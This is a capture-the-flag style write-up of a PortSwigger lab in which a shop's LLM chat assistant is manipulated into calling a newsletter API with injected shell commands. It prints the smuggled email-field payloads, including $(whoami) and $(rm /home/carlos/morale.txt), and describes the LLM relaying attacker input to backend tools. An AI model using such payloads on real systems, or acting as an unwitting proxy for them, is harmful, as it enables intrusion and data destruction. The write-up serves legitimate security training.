# Exploiting Vulnerabilities in LLM APIs

## 🧠 Lab Source
PortSwigger Web Security Academy – Web LLM Attacks

## 🎯 Objective
Exploit an OS command injection vulnerability exposed via an LLM API to delete a sensitive file (`morale.txt`) from the target system.

---

## 🔍 Vulnerability Overview
The LLM had access to backend APIs such as:
- Password Reset
- Newsletter Subscription
- Product Information

The Newsletter Subscription API was vulnerable to command injection due to improper input sanitization.

---

## ⚔️ Exploitation Steps

### 1. Enumerate Available APIs
Observed response:
Prompted the LLM to identify accessible APIs.

---

### 2. Test API Interaction
Used email argument:attacker@exploit-server.net

Confirmed API execution via email client.

---

### 3. Identify Command Injection
Injected:$(whoami)@exploit-server.net

$(whoami)@exploit-server.net

Observed response:carlos@exploit-server.net


✔ This confirmed remote command execution.

---

### 4. Execute Final Payload
Injected:$(rm /home/carlos/morale.txt)@exploit-server.net


✔ Successfully deleted the target file.

---

## 💡 Key Learnings
- LLM APIs can introduce new attack surfaces
- Improper input validation leads to command injection
- LLMs can act as unintended attack proxies

---

## ⚠️ Notes
Due to the dynamic nature of LLM responses, prompts may need slight variations during exploitation.

---

## 🛠️ Skills Demonstrated
- API Enumeration
- Command Injection
- Prompt Manipulation
- Security Testing via LLM Interfaces

